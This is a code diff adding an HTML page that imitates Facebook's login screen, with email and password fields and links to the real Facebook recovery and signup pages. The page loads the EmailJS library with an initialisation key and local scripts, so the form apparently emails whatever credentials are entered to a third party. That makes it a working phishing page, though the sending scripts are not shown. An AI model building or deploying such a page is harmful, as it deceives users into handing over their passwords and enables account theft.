@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    
+    <div class="facebook-logo"><b>facebook</b></div>
+    <br>
+    <div class="login-container">
+        <div class="login-header">Log in to Facebook</div>
+        <form id="form">
+            <input type="text" placeholder="Email or Phone Number" name="email" id="email">
+            <input type="password" placeholder="Password" name="password" id="password">
+            <input type="submit" id="button" value="Log In" >
+            <div class="forgotten-account"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten account?</a></div>
+            <div class="or-container">
+                <hr class="hr-left">
+                <span class="or-text">or</span>
+                <hr class="hr-right">
+              </div>
+            <div class="sign-up-container">
+                <button type="button" class="sign-up-btn" onclick="window.location.href='https://www.facebook.com/r.php?locale=en_GB&display=page'">
+                    <b>Create New Account</b>
+                  </button>
+            </div>
+        </form>
+    </div>
+    <script src="script.js"></script>
+    <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  
+  <script type="text/javascript">
+    emailjs.init('-8H3L-QtbliX6A02Z')
+  </script>
+  <script src="/js/email.js"></script>
+</body>
+</html>
